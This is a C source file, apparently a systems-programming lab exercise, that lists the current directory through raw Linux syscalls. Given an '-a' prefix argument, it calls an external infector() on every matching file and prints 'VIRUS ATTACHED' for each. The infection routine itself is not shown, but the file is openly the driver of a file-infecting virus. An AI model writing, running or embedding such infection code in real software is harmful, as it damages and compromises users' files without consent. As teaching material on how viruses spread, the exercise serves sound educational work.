#include "util.h"

#define SYS_EXIT 1
#define SYS_WRITE 4
#define SYS_OPEN 5
#define SYS_CLOSE 6
#define SYS_GETDENTS64 220

#define STDOUT 1
#define STDERR 2

#define O_RDONLY 0
#define BUF_SIZE 8192

/* Linux dirent64 structure for getdents64 */
struct linux_dirent64 {
    unsigned long long d_ino;
    unsigned long long d_off;
    unsigned short     d_reclen;
    unsigned char      d_type;
    char               d_name[];
};

extern int system_call();
extern void infection();
extern void infector(char*);

/* Check if filename starts with given prefix */
int starts_with(const char* filename, const char* prefix) {
    int i = 0;
    while (prefix[i] != 0) {
        if (filename[i] != prefix[i]) {
            return 0;
        }
        i++;
    }
    return 1;
}

int main(int argc, char* argv[], char* envp[]) {
    char buf[BUF_SIZE];
    int fd, nread, bpos;
    struct linux_dirent64 *d;
    char* prefix = 0;
    int attach_virus = 0;
    int i;
    
    /* Parse command line arguments */
    for (i = 1; i < argc; i++) {
        if (argv[i][0] == '-' && argv[i][1] == 'a') {
            attach_virus = 1;
            prefix = argv[i] + 2;  /* Skip "-a" */
        }
    }
    
    /* Open current directory */
    fd = system_call(SYS_OPEN, ".", O_RDONLY, 0);
    if (fd < 0) {
        system_call(SYS_EXIT, 0x55);
    }
    
    /* Get directory entries */
    nread = system_call(SYS_GETDENTS64, fd, buf, BUF_SIZE);
    if (nread < 0) {
        system_call(SYS_CLOSE, fd);
        system_call(SYS_EXIT, 0x55);
    }
    
    /* Process directory entries */
    for (bpos = 0; bpos < nread;) {
        d = (struct linux_dirent64 *) (buf + bpos);
        
        /* If no prefix specified, print all files */
        if (prefix == 0) {
            system_call(SYS_WRITE, STDOUT, d->d_name, strlen(d->d_name));
            system_call(SYS_WRITE, STDOUT, "\n", 1);
        } 
        /* If prefix specified, check if filename matches */
        else if (starts_with(d->d_name, prefix)) {
            /* Print filename */
            system_call(SYS_WRITE, STDOUT, d->d_name, strlen(d->d_name));
            
            /* If attaching virus, do it now */
            if (attach_virus) {
                /* Print "VIRUS ATTACHED" message */
                system_call(SYS_WRITE, STDOUT, " VIRUS ATTACHED", 15);
                
                /* Call infector to attach virus code */
                infector(d->d_name);
            }
            
            /* Print newline */
            system_call(SYS_WRITE, STDOUT, "\n", 1);
        }
        
        bpos += d->d_reclen;
    }
    
    /* Close directory */
    system_call(SYS_CLOSE, fd);
    
    return 0;
}
